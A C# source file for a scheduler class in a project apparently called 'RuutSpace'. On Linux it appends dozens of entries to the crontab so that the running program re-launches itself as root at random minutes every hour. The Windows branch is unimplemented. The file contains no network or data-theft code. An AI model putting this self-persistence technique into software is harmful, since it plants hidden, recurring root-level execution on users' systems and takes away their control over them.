using System;
using System.IO;
using System.Runtime.InteropServices;

namespace RuutSpace
{
    public class Scheduler
    {
        internal static Random _random = new Random();
        private interface IScheduler
        {
            public bool IsScheduled();
            public void CreateSchedule();
        }
        internal sealed class Cron : IScheduler{
            // Example of job definition:
            // .---------------- minute (0 - 59)
            // |  .------------- hour (0 - 23)
            // |  |  .---------- day of month (1 - 31)
            // |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
            // |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
            // |  |  |  |  |
            // *  *  *  *  * user-name command to be executed
            public void CreateSchedule()
            {
                var executePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;

                // To play every few minutes, several cronStrings need to be created
                // and filled into crontab
                for (var i = 0; i < 57; ++i)
                {
                    var minute = _random.Next(i, i + 2);
                    i = minute; //      minute       hour                        day of month              month                         dayofWeek                  root                  command to be executed
                    var cronString = $"{minute} {Constants.CronEmptyValue} {Constants.CronEmptyValue} {Constants.CronEmptyValue} {Constants.CronEmptyValue} {Constants.CronDefaultUser} \"{executePath}\"";

                    SaveCronStringToFile(cronString);
                }
            }

            public bool IsScheduled()
            {
                var fileContent = GetCrontabContent();
                return fileContent.Contains(Constants.ExecutableName);
            }

            private void SaveCronStringToFile(string str)
            {
                var fileContent = "";
                fileContent = GetCrontabContent();

                fileContent += $"{str}{Environment.NewLine}";

                SaveCrontabContent(fileContent);
            }

            private string GetCrontabContent()
            {
                var content = "";
                using (var reader = new StreamReader(Constants.CrontabLocation))
                {
                    content = reader.ReadToEnd();
                    reader.Close();
                }
                return content;
            }

            private void SaveCrontabContent(string content)
            {
                using (var writer = new StreamWriter(Constants.CrontabLocation))
                {
                    writer.Write(content);
                    writer.Close();
                }
            }
        }

        internal sealed class TaskSched : IScheduler
        {
            public void CreateSchedule()
            {
                throw new NotImplementedException();
            }

            public bool IsScheduled()
            {
                throw new NotImplementedException();
            }
        }
        
        public bool IsScheduled()
        {
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
            {
                return new Cron().IsScheduled();
            }else if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                return new TaskSched().IsScheduled();
            }
            else
            {
                throw new NotImplementedException("Don't know how to work with OSX and FreeBSD");
            }
            return false;
        }

        public void CreateSchedule()
        {
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
            {
                new Cron().CreateSchedule();
            }else if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                throw new NotImplementedException();
                new TaskSched().CreateSchedule();
            }
            else
            {
                throw new NotImplementedException("Don't know how to work with OSX and FreeBSD");
            }
        }
    }
}